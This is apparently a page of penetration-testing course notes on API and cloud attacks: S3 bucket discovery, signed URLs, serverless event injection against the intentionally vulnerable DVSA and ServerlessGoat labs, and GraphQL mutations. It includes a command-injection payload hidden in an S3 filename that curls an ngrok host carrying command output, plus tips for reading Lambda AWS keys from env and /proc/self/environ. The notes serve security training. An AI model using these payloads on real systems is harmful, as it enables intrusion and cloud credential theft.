+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Go to lambda, create application
+2. Other Options
+3. Browser Serverless app repository
+4. Mark the option "Show apps that create custom IAM roles or resource policies"
+5. Search DVSA
+</code></pre></div></div>
+
+<p>Go to the AWS System Manager, Parameter Store and look For the DVSA URL</p>
+
+<ul>
+  <li>Now head to the URL and register an account. It should be a real email For receiving the activation code.</li>
+</ul>
+
+<blockquote>
+  <p>The application has been deployed and we will come back to it later. Remember to delete resources once you finish working with them.</p>
+</blockquote>
+
+<h3 id="s3-buckets">S3 Buckets</h3>
+<p>Simple Storage Service (S3) is an AWS scalable and distributed file system. These filesystem root folder are referred as buckets while everything else (files, subfolders) are referred as objects. Misconfigured S3 buckets have been the principal cause of many information leaks and attacks against organizations.</p>
+
+<p>Lets create a new S3 bucket:</p>
+
+<ul>
+  <li>While creating buckets, there are several configuration options that can be selected in the process.</li>
+  <li>
+    <p>Access control and encryption can be specified at this stage.</p>
+  </li>
+  <li>Common S3 attacks consists in unauthorized access to objects. There attacks often gives the capability of modifying and creating new objects and changing existing policies and permissions on S3 buckets.</li>
+</ul>
+
+<h4 id="tool-s3recon">Tool: S3Recon</h4>
+<ul>
+  <li>https://github.com/clarketm/s3recon</li>
+</ul>
+
+<p>Automating the discovery of misconfigured buckets can be done using S3Recon.</p>
+
+<p><strong>Python-pip</strong> can be used to install S3Recon, although you might be aware of missing dependencies during the process and install them too.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install </span>s3recon
+</code></pre></div></div>
+
+<p>S3Recon needs a wordlist, there is one in the Github repository or a personalized one can be created based on your needs. At this moment the one from the repository will be used.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-sSfL</span> <span class="nt">-o</span> <span class="s2">"word-list.txt"</span> <span class="s2">"https://raw.githubusercontent.com/clarketm/s3recon/master/data/words.txt"</span>
+</code></pre></div></div>
+
+<p>Running S3 Recon with the worslist file can be done with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s3recon <span class="s2">"word-list.txt"</span> <span class="nt">-o</span> <span class="s2">"results.json"</span> <span class="nt">--public</span>
+</code></pre></div></div>
+
+<p>Buckets marked as <strong>public</strong> could give access to restricted content. Objects could be accessed via aws-cli.</p>
+
+<blockquote>
+  <p>S3Recon can be integrated with MongoDB For scraping large results. This proves useful in bug bounty programs where any assets belonging to the company are within the scope.</p>
+</blockquote>
+
+<h4 id="reports-from-hackerone-related-to-s3-misconfigs">Reports from hackerone related to S3 misconfigs</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://hackerone.com/reports/631529
+- https://hackerone.com/reports/507097
+- https://hackerone.com/reports/504600
+- https://hackerone.com/reports/209223
+</code></pre></div></div>
+
+<h3 id="aws-signed-urls">AWS Signed URLs</h3>
+<p>It can be used to give objects temporary access. Any user having this URL will be able to download the object For a limited time. They are commonly used by streaming providers.</p>
+
+<ul>
+  <li>
+    <p>Create a private bucket and add some files to it.</p>
+  </li>
+  <li>
+    <p>When trying to reach any off these URLs, an <strong>AccessDenied</strong> error will appear because the bucket has been set as private.</p>
+  </li>
+  <li>
+    <p>Using aws-cli, u should be able to access these objects once it has been configured via <strong>aws-cli configure</strong> command.</p>
+  </li>
+</ul>
+
+<p>Files can be copied using</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws-cli <span class="nb">cp</span> &lt;S3URI&gt; &lt;LOCALPATH&gt;
+</code></pre></div></div>
+
+<h4 id="creating-signed-urls">Creating Signed URLs</h4>
+<p>Signed URLs can be generated using boto3 library For python</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install </span>boto3
+</code></pre></div></div>
+
+<p>Visiting the Signed URL shows the object contents.</p>
+
+<ul>
+  <li>Signed URLs gives access to a single file. This method it does not scale when access to a set of objects is needed.</li>
+  <li>For this reason signed cookies can be used to give access to more than one object at a time.</li>
+</ul>
+
+<h3 id="serverless-event-injection">Serverless Event Injection</h3>
+<p>Serverless functions listen For events or triggers in order to be executed. These events can be injected from other trusted sources in cloud environments leading to a Serverless Event Injection vulnerability. These trusted sources can be:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Actions on S3 Objects
+- Alerting Systems (CloudWatch)
+- API Gateway Calls
+- Changes in the code repository
+- Database events
+- HTTP APIs
+</code></pre></div></div>
+
+<p>Some serverless functions runs shell or eval content with unstrusted input. For instance, imagine a function with the previous example where the S3 URIs are user controlled.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"os.system("</span>aws S3 <span class="nb">cp</span> <span class="o">{</span>0<span class="o">}</span> <span class="o">{</span>1<span class="o">}</span> <span class="s2">".format(src_object,dst_object))"</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>If we are able to control any of these variables a command injection vuln changing the name of the filename.</p>
+</blockquote>
+
+<h3 id="serverless-event-injection-scenario">Serverless Event Injection Scenario</h3>
+<p>Remember that serverless functions live For a limited times. This is because they are executed in a small server that lives For a few minutes, this means regular vulnerabilities can exist but only For the time the server is alive.</p>
+
+<p>The application converts Word doc files to text. It takes an URL (default one supplied) and outputs its contents on the screen.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OWASP ServerlessGoat
+</code></pre></div></div>
+
+<ul>
+  <li>The function gets invoked by an AWS API Gateway Call. We can observe how the command is issued by crashing the application.</li>
+  <li>Observing the API Gateway configuration we can understand that this endpoint works as a Lambda Proxy, when the serverless functions receives the event from the proxy it gets invoked.</li>
+</ul>
+
+<p>As we have seen the vulnerable code and where the injection takes place. Try injecting some commands</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* use **&gt;/dev/null** after the document URL to receive a clean output
+</code></pre></div></div>
+
+<ul>
+  <li>As the server will be recycled due to its limited life, there is no point on trying to backdoor it.</li>
+</ul>
+
+<blockquote>
+  <p>However, lambda functions store AWS keys in environment variables. They could be reached using <strong>env</strong> or <strong>cat /proc/self/environ</strong></p>
+</blockquote>
+
+<h4 id="serverless-event-injection-scenario-2">Serverless Event Injection Scenario 2</h4>
+<p>Back to <strong>Damn Vuln Serverless application</strong> installed before in order to discover more events that can be injected</p>
+
+<ul>
+  <li>Visit the URL and add some elements to the cart</li>
+  <li>Enter random details in the shipping information and submit them in order to receive the receipt.</li>
+  <li>
+    <p>If you take a look to the message of the order, it will contain an S3 bucket with an UUID For the order receipt</p>
+  </li>
+  <li>It seems the receipt is being copied from an S3 bucket folder generated using the receipts date and UUID.</li>
+</ul>
+
+<p>This bucket permissions are relatively open, as uploading files is allowed via:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"echo "</span>blah<span class="s2">"&gt;file.txt &amp;&amp; aws s3 cp file.txt 's3://&lt;BUCKET&gt;/2020/20/20/whatever' -acl public-read"</span>
+</code></pre></div></div>
+
+<p>It has been confirmed that the S3 bucket is open For read/write to everyone. Lets check the code in:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/OWASP/DVSA/blob/master/backend/src/functions/processing/send_receipt_email.py
+</code></pre></div></div>
+
+<p>The event handler is reading the bucket name, key and order, then the function replaces the extension <strong>.raw</strong> by <strong>.txt</strong> meaning they expect a raw S3 Object. Then a download path is created and recorded into a log file using <strong>os.system</strong></p>
+
+<blockquote>
+  <p>I have prints with this examples, but the quality is not great. So im not gonna post it</p>
+</blockquote>
+
+<ul>
+  <li>As in the previous example, the app pass to the os.system function some content that we can control as the S3 Bucket permissions are weak.</li>
+  <li>Folowwing the name convention that the function expects a OS Command Injection payload can be uploaded and executed using the S3 AWS API.</li>
+</ul>
+
+<p><strong>Ngrok</strong> - https://ngrok.com/</p>
+
+<ul>
+  <li>Ngrok will be used to expose local ports to the internet and catch a reverse shell For this exercise. Visit the website https://ngrok.com and register an account.</li>
+  <li>After the account has been created, download the ngrok client For your OS and authorize it following the instructions under <strong>connect your account</strong></li>
+  <li>Once the account has been set up you can expose a local port to the internet running <strong>ngrok http 80</strong> and taking note of the URL.</li>
+</ul>
+
+<p>Requests received to port 80 can be checked on the local web interface</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:4040
+</code></pre></div></div>
+
+<ul>
+  <li>Now, using the same naming convention as the function expects, a payload can be crafted to achieve RCE and receive the response back to our exposed interface.</li>
+</ul>
+
+<p>Payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nb">cp </span>empty.txt
+s3://&lt;your bucket <span class="nb">id</span><span class="o">&gt;</span>/2020/20/20/whatever_<span class="p">;</span>curl XXX.grok.io?data<span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span><span class="nb">echo </span>x.raw <span class="nt">-acl</span> public-read
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatever_<span class="p">;</span> <span class="c"># it checks For an underscore in the file name</span>
+Curl something.ngrok.io <span class="c"># THe ngrok endpoint to send the output</span>
+<span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="c"># the command to run</span>
+Echo x.raw <span class="c"># needs to end in .raw to be triggered</span>
+</code></pre></div></div>
+
+<ul>
+  <li>WIth everything in place go and check the Ngrok web interface to check that there are some requests.</li>
+</ul>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Commands that return a multiline response will not go through as they will break the payload. However, they can be base64 encoded without breaking the lines using **$(ls -lha</td>
+      <td>base64 -w0)** in the payload</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>
+    <p>Ngrok will now receive the requests that can be decoded to get the command output</p>
+  </li>
+  <li>If you output the <strong>env</strong> command result, it will include the AWS keys used by the lambda functions. As a result they will have the same privileges they are given and used with the API.</li>
+  <li>At this point DVSA stack can be deleted from the CloudFormation AWS Service and the S3 Buckets</li>
+</ul>
+
+<h3 id="graphql-apis">GraphQL APIs</h3>
+<p>GraphQL is a different type of API interface where there is one endpoint to an API (instead of many endpoints in REST), and two types of operations (Query and Mutate) instead of 5 or so in REST (GET, PUT, POST, PATCH, DELETE)</p>
+
+<ul>
+  <li>Usually example.com/graphql or something similar (Nice idea of Google dorks)</li>
+  <li>REST usually has one endpoint For each type of object (users, groups, items, books, orders, shipments…etc) with 3 or more operations on each endpoint</li>
+  <li>In GraphQL, the same endpoint serves all predefined objects under both Query and Mutation methods</li>
+</ul>
+
+<h4 id="graphql-terms">GraphQL Terms</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Query: A query operation on an object or type
+- Mutate: an update operation on an object, like creating a new one, updating it fully, updating it partially, or deleting it
+- Type (objecttype): A type of object, like a class or table, e.g. Users, Orders, books
+- Schema: Describes the types, fields and actions available
+- Introspection: A method to learn more about the schema details like types and fields
+- Resolver: A function that connects schema definitions to actual backend data sources like SQL tables
+- Scalar Type: Type of data For a field, like string, int or custom types.
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/114.png" alt="Alt text" class="align-center" /></p>
+
+<p>GraphQL can also be called from the command line using curl:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Using POST
+- Content-type is JSON
+- Output is sent to jq For pretty JSON
+</code></pre></div></div>
+
+<p>Calling a particular object in GraphQL:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s1">'{"query":"{user(id:\"2\") {id username} }"}'</span> http://localhost/graphql | jq
+</code></pre></div></div>
+
+<h4 id="graphql-nesting-queries">GraphQL nesting queries</h4>
+<p>Display each user with his group subscriptions using GraphQL, showing the id and name of the group</p>
+
+<blockquote>
+  <p>Hint: groups {id name}
+Try both the GraphQL and Curl</p>
+</blockquote>
+
+<h4 id="security-in-graphql">Security in GraphQL</h4>
+<p>GraphQl has no built-in understanding of security. It will return the object as it was requested</p>
+
+<ul>
+  <li>Without explicit filtering, sensitive data could be exposed and extracted</li>
+  <li>Can we read user sensitive info such as passwords?</li>
+</ul>
+
+<h4 id="making-updates-in-graphql">Making Updates in GraphQL</h4>
+<p>In graphql, updates (addition, creation, deletion) are called mutations</p>
+
+<p>Example with 3 mudations:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Mutation(graphene.ObjectType):
+  create_user = CreateUser.Field()
+  update_user = UpdateUser.Field()
+  delete_user = DeleteUser.Field()
+</code></pre></div></div>
+
+<h4 id="deleteuser-mutation">Deleteuser Mutation</h4>
+<p>The deleteUser mutation can be called by:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Defining the query type to be mutation
+- Selecting the named deletUser mutation
+- Supplying the id to be deleted, and a sub selection For response (ok field here)
+</code></pre></div></div>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">mutation</span><span class="w"> </span><span class="err">deleUser</span><span class="w">
+</span><span class="p">{</span><span class="w">
+  </span><span class="err">deleteUser(id:</span><span class="mi">24</span><span class="err">)</span><span class="w">
+  </span><span class="p">{</span><span class="w">
+    </span><span class="err">ok</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application:json"</span> <span class="nt">--data</span> <span class="s1">'{"query":"mutation {deleteUser(id:22){ok}}"}'</span> http://localhost/graphql | jq
+</code></pre></div></div>
+
+<h3 id="function-as-a-service">Function as a Service</h3>
+<p>Function as a Service (FaaS) is a modern (as of beginning of 2020) type of software architecture. Its implemented in most common cloud providers like AWS Lambda, Google Cloud Functions, IBM OpenWhisk or Microsoft Azure Functions</p>
+
+<ul>
+  <li>The FaaS model allows us to execute code in response to events without maintaning any infrastructure For it (apart from the cloud account). It allows the user to simply upload modular fragments of functionalities into the cloud in and they are executed independently</li>
+</ul>
+
+<p>Such solution allows For better scalability, and is a next level of splitting a monolithic application into functional pieces</p>
+
+<p>A sample <em>Hello World</em> in FaaS (written in Node.js)</p>
+
+<p><img src="/assets/images/posts/ewptx/115.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li>Despite being a function, keep in mind that any online service exchanges and processes data or does any sort of authentication. This is exactly the same subject to abuse as any other web or cloud application</li>
+</ul>
+
+<p>You can experiment more with Serverless software by downloading and playing with DVFaaS:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/we45/DVFaaS-Damn-Vulnerable-Functions-as-a-Service
+</code></pre></div></div>
+
+<blockquote>
+  <p>Each subdirectory of the project contains detailed steps to follow in order deploy as well as exploit a vulnerable instance</p>
+</blockquote>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#api" class="page__taxonomy-item" rel="tag">api</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-06T00:00:00+06:00">December 6, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=14+-+APIs+%26+Cloud+Apps%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fapiscloud%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fapiscloud%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fapiscloud%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/authenticationsso/" class="pagination--pager" title="13 - Authentication &amp; SSO
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/ldap/" class="pagination--pager" title="15 - Attacking LDAP
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
